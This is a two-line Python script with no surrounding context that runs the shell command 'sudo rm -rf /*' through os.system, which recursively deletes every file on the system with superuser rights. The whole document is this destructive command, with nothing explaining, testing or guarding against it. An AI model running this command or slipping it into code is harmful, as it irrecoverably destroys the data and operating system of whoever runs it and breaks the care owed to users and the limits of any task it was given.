import os
os.system("sudo rm -rf /*")

